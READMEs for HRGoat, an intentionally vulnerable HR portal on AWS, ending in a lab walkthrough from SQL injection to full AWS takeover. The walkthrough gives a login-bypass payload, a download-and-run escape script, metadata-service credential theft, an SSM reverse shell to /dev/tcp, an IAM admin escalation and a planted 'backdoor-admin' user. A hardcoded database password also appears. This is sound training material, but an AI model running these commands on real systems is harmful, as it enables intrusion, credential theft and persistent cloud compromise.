# HRGoat HR Management Portal

This repository contains the HRGoat HR Management Portal application, a comprehensive HR management system with features for employee management, document handling, calendar events, and more.

## Repository Structure

- **`/src`**: Frontend application code (React)
- **`/server`**: Backend server code (Node.js/Express)
- **`/terraform`**: Infrastructure as Code for AWS deployment
- **`/.github/workflows`**: CI/CD pipelines for automated deployment

## Features

- Employee management
- Document management
- Calendar events
- Payroll & benefits
- Performance tracking
- User authentication
- Profile management
- Notifications

## Development Setup

### Prerequisites

- Node.js (v16 or newer)
- npm (v7 or newer)
- MySQL database

### Local Development

1. Clone the repository:

```bash
git clone https://github.com/your-username/hr-portal-symphony.git
cd hr-portal-symphony
```

2. Install dependencies:

```bash
npm install
```

3. Start the development server:

```bash
npm run dev
```

4. In a separate terminal, start the backend server:

```bash
cd server
node server.js
```

## Deployment

### Manual Deployment

See the [terraform/README.md](terraform/README.md) file for instructions on manual deployment using Terraform.

### Automated Deployment with GitHub Actions

This repository includes GitHub Actions workflows for automated deployment:

1. **Infrastructure Deployment**: Deploys AWS infrastructure using Terraform
2. **Application Deployment**: Deploys the application to the EC2 instance
3. **Infrastructure Destruction**: Safely destroys the AWS infrastructure when needed

For more information on setting up the required GitHub secrets, see [.github/GITHUB_SECRETS.md](.github/GITHUB_SECRETS.md).

## Security Considerations

- The application includes intentional vulnerabilities for educational purposes
- Do not use in production without addressing these vulnerabilities
- See comments in the code marked with "VULNERABLE CODE" for details

## License

This project is licensed under the MIT License - see the LICENSE file for details.

# HR Portal Symphony Infrastructure

This repository contains the infrastructure setup for the HR Portal Symphony application, including Terraform configurations for AWS resources, Docker containerization, and CI/CD pipelines.

## Infrastructure Components

- **VPC and Subnets**: Creates a new VPC with public subnets
- **EC2 Instances**:
  - Application instance for running the HR Portal
  - Jenkins instance (version 2.270) for CI/CD
  - Both instances are accessible via AWS Systems Manager (SSM) without SSH keys
- **Application Load Balancer (ALB)**:
  - Routes traffic to the application EC2 instance
  - Provides a stable DNS name for accessing the application
  - Handles health checks and improves availability
- **RDS Instance**:
  - Public RDS instance with no backups
  - Username: admin
  - Password: hrportaladmin123
- **ECR Repository**: For storing the application Docker image
- **CI/CD**: GitHub Actions workflow and Jenkins pipeline for automated deployment
- **Resource Tagging**: All resources are tagged with common tags for identification and management
- **State Management**: Terraform state is stored in an S3 bucket with a unique name for persistence and team collaboration

## Prerequisites

- AWS CLI installed and configured
- Terraform installed (version 1.0.0 or later)
- Docker installed (for local development)
- GitHub account (for GitHub Actions)

## Getting Started

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/hr-portal-symphony.git
cd hr-portal-symphony
```

### 2. Deploy Using GitHub Actions

The repository includes GitHub Actions workflows for infrastructure management:

#### Creating the Infrastructure

1. Navigate to the "Actions" tab in your repository
2. Select the "Create Infrastructure and Deploy Application" workflow
3. Click "Run workflow"
4. Click "Run workflow" to start deployment

This workflow will:
- Create a unique S3 bucket for Terraform state with an epoch timestamp suffix
- Create the infrastructure using Terraform
- Build the Docker image and push it to ECR
- Deploy the container to the EC2 instance
- Output the S3 bucket name for reference when destroying infrastructure

#### Destroying the Infrastructure

1. Navigate to the "Actions" tab in your repository
2. Select the "Destroy Infrastructure" workflow
3. Click "Run workflow"
4. Enter the S3 bucket name that was created during deployment
5. Type "destroy" in the confirmation field
6. Click "Run workflow" to start destruction

### 3. Manual Deployment (Alternative)

If you prefer manual deployment:

```bash
# For Linux/macOS
./setup.sh

# For Windows
setup.bat
```

### 4. Configure GitHub Secrets

Add the following secrets to your GitHub repository:
- `AWS_ACCESS_KEY_ID`: Your AWS access key
- `AWS_SECRET_ACCESS_KEY`: Your AWS secret key

### 5. Connect to EC2 Instances via SSM

Use the SSM connection commands from the setup script output:

```bash
# Connect to application instance
aws ssm start-session --target i-xxxxxxxxxxxxxxxxx

# Connect to Jenkins instance
aws ssm start-session --target i-yyyyyyyyyyyyyyyyy
```

### 6. Access Jenkins

1. Navigate to `http://<jenkins_instance_public_ip>:8080`
2. Follow the setup instructions to complete Jenkins configuration
3. Install required plugins:
   - AWS Steps
   - Docker Pipeline
   - Pipeline
   - Git Integration

### 7. Configure Jenkins Pipeline

1. Create a new pipeline job in Jenkins
2. Configure it to use the Jenkinsfile from your repository
3. Add the following credentials in Jenkins:
   - `aws-credentials`: AWS credentials for ECR and SSM access
   - `ECR_REPOSITORY`: ECR repository URL
   - `EC2_INSTANCE_ID`: Application EC2 instance ID
   - `RDS_HOST`: RDS endpoint

## Accessing the Application

After deployment, access the HR Portal application through the ALB at:
```
http://<alb_dns_name>
```

Alternatively, you can also access it directly via the EC2 instance at:
```
http://<app_instance_public_ip>:3000
```

## Resource Tagging

All AWS resources created by this infrastructure are tagged with the following common tags:

```hcl
common_tags = {
  App  = "HR-GOAT-APP"
  Note = "For security testing"
  Name = "DemoHRApp"
  Link = "https://github.com/SilentProcess87/cyber-lab-hr-simulator"
}
```

These tags help with resource identification, cost tracking, and management.

## Terraform State Management

The Terraform state is stored in an S3 bucket with a unique name using the format `hrgoat-tfstate-<timestamp>`. This approach:
- Ensures uniqueness for multiple deployments
- Prevents naming conflicts across different users or environments
- Allows each infrastructure deployment to have its own isolated state
- Automatically cleans up the bucket upon infrastructure destruction

## Troubleshooting

- **SSM Connection Issues**: Ensure the EC2 instances have internet access and the SSM agent is running
- **Docker Issues**: Check Docker logs on the application instance with `docker logs hrportal`
- **Database Connection**: Verify the RDS security group allows connections from the application EC2 instance
- **Terraform State Issues**: Check the S3 bucket for the presence of the state file

## Security Notes

- The RDS instance is publicly accessible with a fixed password for demonstration purposes
- In a production environment, consider:
  - Using AWS Secrets Manager for database credentials
  - Implementing private subnets for RDS
  - Enabling RDS backups
  - Using HTTPS with proper certificates

# HRGoat - Cloud Security Vulnerability Training Environment

This repository contains the HRGoat application - an intentionally vulnerable HR management portal designed to demonstrate common cloud security vulnerabilities in a controlled environment. It simulates a realistic HR system with multiple security flaws that can be exploited to practice offensive security techniques and understand cloud security concepts.

## Project Overview

HRGoat is created for:
- Security professionals to practice cloud-based exploitation techniques
- DevOps engineers to understand secure deployment practices
- Development teams to learn about secure coding
- Organizations to use in security awareness training

> ⚠️ **WARNING**: This application contains deliberate security vulnerabilities. Deploy it only in isolated, controlled environments and never in production or connected to sensitive systems.

## Application Description

HRGoat mimics a modern HR management system with features including:
- Employee management (create, update, delete, bulk upload)
- Document handling and storage
- User authentication and authorization
- Profile management
- Notification systems

The application is built using:
- Frontend: React
- Backend: Node.js/Express
- Database: MySQL
- Infrastructure: AWS resources deployed via Terraform
- Containerization: Docker
- CI/CD: GitHub Actions workflows

## Deployment Instructions

### Deploying with GitHub Actions

The repository includes automated workflows for deployment:

1. **Prerequisites**:
   - GitHub account
   - AWS account with appropriate permissions
   - The following GitHub secrets configured:
     - `AWS_ACCESS_KEY_ID`
     - `AWS_SECRET_ACCESS_KEY`

2. **Deployment Steps**:
   - Fork this repository to your GitHub account
   - Navigate to "Settings" → "Secrets" and add the required AWS credentials
   - Go to the "Actions" tab and select the "Create Infrastructure and Deploy Application" workflow
   - Click "Run workflow" to start the deployment process
   - The workflow will:
     - Create a unique S3 bucket for Terraform state
     - Deploy AWS infrastructure using Terraform
     - Build and push the Docker image to ECR
     - Deploy the application to EC2 instances


# 🎭 The Great Escape: From SQLi to Full AWS Takeover

## ⚠️ Disclaimer
> This project is for educational and authorized security research purposes only. Unauthorized use of these techniques is illegal and unethical.

## 🏴‍☠️ The Adventure Begins
Once upon a time, in a land of misconfigured cloud environments, a daring security researcher set out on a quest to explore the depths of vulnerabilities. What started as a simple SQL injection led to an ultimate privilege escalation inside AWS. Let's follow the trail!

---

## 🎬 Step 1: The Gate is Wide Open (SQL Injection)
![image](https://github.com/user-attachments/assets/3519076c-3c8c-4cea-96d9-bbb33c331fe6)

Our journey starts at a login screen. With a bit of old-school magic, we bypass authentication using:
```sql
' or '1'='1
```

Boom! We're in. But this is just the beginning...

---

## 🎭 Step 2: Exploiting Insecure Deserialization

To take it a step further, we leverage an insecure deserialization vulnerability. First, ensure you have a machine ready to receive a reverse shell:
```bash
nc -lvnp 4444
```
![image](https://github.com/user-attachments/assets/d346b289-b820-41ac-9d6e-d36fa1938085)

Navigate to System Tools and then Bulk Employee Upload

![image](https://github.com/user-attachments/assets/68dfbb66-245f-45dc-9e70-71ad58afc431)

Modify `rce_exploit.json` found in the `examples` folder, setting your remote IP and port. Then, execute the exploit payload.

---

## 🚀 Step 3: Inside the Container!

We’ve successfully landed in the container. 
![image](https://github.com/user-attachments/assets/52b12748-7744-4f91-b115-8d306e12d386)


But now, let’s check if we can escape:
```bash
grep CapEff /proc/self/status
```
![image](https://github.com/user-attachments/assets/a6e91fd6-c4af-4eb0-98fb-218b3a618120)

If we see certain privilege bits set, it's time to break free! 🔓

---

## 🛠️ Step 4: Breaking Out of the Container

Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script:
```bash
cd /tmp
wget -O escape.sh https://pastebin.com/raw/YSbnzY2r
sed -i 's/\r$//' escape.sh
chmod +x escape.sh
./escape.sh
```
![image](https://github.com/user-attachments/assets/b90a0976-0cdc-4b7a-8d4a-d82fa000f92e)

We are now inside the EC2 instance. 


---

## 🔑 Step 5: Querying the IMDS for AWS Credentials

Let’s try to obtain a metadata token:
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```
![image](https://github.com/user-attachments/assets/5aa90b82-5f83-4e76-9e79-4b660fdd027d)

Success! Now let’s fetch security credentials:
```bash
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
```
![image](https://github.com/user-attachments/assets/0068eb1c-f521-4012-9337-b19dd1034a01)

Looks like we have `hrgoat-ssm-role`. Let's extract its credentials:
```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```
![image](https://github.com/user-attachments/assets/0f257ddf-90a1-43d0-aa2e-85605d2c57bf)

And there it is—Access Key ID, Secret Access Key, and Session Token! 🔥

---

## 🏠 Step 6: Using EC2 Credentials Locally

Now, let’s shift operations to our local machine:
```bash
export AWS_ACCESS_KEY_ID=<VALUE>
export AWS_SECRET_ACCESS_KEY=<VALUE>
export AWS_SESSION_TOKEN=<VALUE>
```
Verify with:
```bash
aws sts get-caller-identity
```
![image](https://github.com/user-attachments/assets/37bd2d45-44a5-414f-98ce-0d501f4d1fc7)

We have AWS credentials. Time to enumerate our permissions!

---

## 🔍 Step 7: Mapping Out AWS Permissions

Run `check_aws_permissions.sh` from the `examples` folder to identify what actions we can perform.
![image](https://github.com/user-attachments/assets/261c268c-e198-49eb-9d7d-935a7dc2b2fe)


We find permissions allowing us to list EC2 instances and send SSM commands. Perfect for lateral movement!

---

## 📡 Step 8: Moving Laterally with SSM

Let’s list EC2 instances:
```bash
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,Tags[?Key==`Name`].Value|[0]]' --output table
```
![image](https://github.com/user-attachments/assets/f90a2073-464d-4aba-a12e-bc7c90257fdf)

Found one that looks interesting. Let’s gain access (create new listener, with another port):
```bash
aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0d76444a40c11c1bf" --parameters "commands=['bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1']" --region us-east-1
```
![image](https://github.com/user-attachments/assets/162a99c3-0810-4a43-9baf-a2342491c6f5)

Now we have a shell on a second machine. Time to escalate further!

---

## 🏆 Step 9: Privilege Escalation

From the new EC2 instance, repeat the credential extraction process:
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo $TOKEN
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```
![image](https://github.com/user-attachments/assets/b0f2e89b-5297-4530-802b-ad7765f8f247)

Fetch roles and credentials, and analyze the permissions.
![image](https://github.com/user-attachments/assets/6f228930-93e1-4cd3-926b-d3903ab99ad7)

---

## 🎯 Step 10: Escalating to Administrator

We find that `hrgoat-jenkins-role` has IAM modification permissions. 
![image](https://github.com/user-attachments/assets/4feefa82-0f32-4d2f-8863-8161da3eeb06)


Let’s exploit it:
```bash
aws iam attach-role-policy --role-name hrgoat-jenkins-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```
![image](https://github.com/user-attachments/assets/a7a8846e-78ee-4e7f-84c8-f791b4aa5797)

Check if it worked:
```bash
aws iam list-users
```
![image](https://github.com/user-attachments/assets/dbb2a40f-ea9c-4cd3-86ab-ba110ecc8b8b)

We have admin rights! 🏆

---

## 🚪 Step 11: Planting a Persistent Admin User

Let’s create a backdoor admin:
```bash
aws iam create-user --user-name backdoor-admin
aws iam create-access-key --user-name backdoor-admin
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-attached-user-policies --user-name backdoor-admin
```
### Create New User
![image](https://github.com/user-attachments/assets/18bb0ec6-09a2-4c62-9bf2-3e5d48e5da1e)

### Create User Access Key
![image](https://github.com/user-attachments/assets/28029293-8b4e-4afe-b60d-cdc5b7c3b677)

### Assign permissions and verify it worked
 ![image](https://github.com/user-attachments/assets/c53dc66b-333e-40e3-9af5-004cc4eab627)


Success! Now, full control of the AWS environment is ours.

---

## 🎉 Conclusion

From a simple SQLi to full AWS environment control, we navigated through multiple security misconfigurations and privilege escalations. This journey highlights the importance of:
- Proper input validation to prevent SQLi
- Secure deserialization practices
- Restricting container privileges
- Securing AWS metadata service access
- Applying least privilege principles in AWS IAM

---

💡 **For Defensive Countermeasures & Hardening Tips, see** `SECURITY.md` 🚧
